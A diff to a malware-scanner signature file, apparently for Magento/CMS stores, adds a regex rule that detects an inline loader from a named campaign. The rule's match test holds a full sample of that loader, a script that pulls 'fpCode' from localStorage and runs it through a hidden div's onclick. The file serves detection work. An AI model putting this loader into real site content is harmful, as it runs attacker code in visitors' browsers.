@@ -1,5 +1,5 @@
 {
-    "version": "2026.10.16",
+    "version": "2026.10.25",
     "signatures": [
         {
             "id": "webshell-eval-base64",
@@ -1738,6 +1738,26 @@
             ],
             "test_should_not_match": [
                 "cd pub; cd media; ls -la"
+            ],
+            "ioc": false
+        },
+        {
+            "id": "cms-loader-fpcode-localstorage-onclick",
+            "name": "CMS loader running localStorage fpCode via onclick",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-cms-block-loader-deepveindrilling",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/localStorage\\.getItem\\(\\s*[\"']fpCode[\"']\\s*\\)[^<]{0,200}setAttribute\\(\\s*[\"']onclick[\"']/i",
+            "description": "Inline CMS block loader that reads the fpCode key from localStorage and runs it as an onclick handler on a hidden div, without eval(). Used by the deepveindrilling.com campaign.",
+            "test_should_match": [
+                "<script>!function(){try{var c=localStorage.getItem(\"fpCode\");if(c){var e=document.createElement(\"div\");e.setAttribute(\"onclick\",c);document.documentElement.appendChild(e);e.click();e.remove()}}catch(e){}}();</script>"
+            ],
+            "test_should_not_match": [
+                "<script>var t=localStorage.getItem(\"theme\");if(t){document.body.setAttribute(\"class\",t)}</script>"
             ],
             "ioc": false
         }
